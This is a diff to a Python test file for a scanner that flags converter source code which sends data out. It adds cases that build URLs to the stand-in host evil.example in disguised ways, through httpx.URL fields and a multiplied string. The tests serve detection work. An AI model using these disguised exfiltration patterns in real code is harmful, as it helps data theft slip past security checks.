@@ -4147,6 +4147,11 @@ def test_a_url_builder_under_an_alias_or_a_result_object_refuses_it():
         'u = up.urljoin(HUB, "//evil.example/c")\n' + send,
         'u = ParseResult("https", "evil.example", "/c", "", "", "").geturl()\n'
         + send,
+        # A client URL object takes its host as a field, so no argument of it
+        # is a URL at all.
+        'import httpx\n'
+        'u = httpx.URL(scheme = "https", host = "evil.example", path = "/c")\n'
+        + send,
     ):
         assert [f.check for f in scan_converter_source(preamble + body)], body
 
@@ -4447,6 +4452,15 @@ def test_a_url_repeated_into_existence_is_read_or_left_a_hole():
         'url = rd(operator.add, ["https", "://evil.example/c"])\n' + send,
     ):
         assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # A count this cannot read leaves the text AND a hole, not only a hole:
+    # returning the hole alone made the multiplication look fully read, so the
+    # walk skipped its children and a URL written out in full named nothing.
+    assert [
+        f.check for f in scan_converter_source(
+            preamble + 'url = "https://evil.example/c" * n\n' + send
+        )
+    ]
 
     # Repeating a separator is ordinary, and it names no destination.
     assert scan_converter_source(
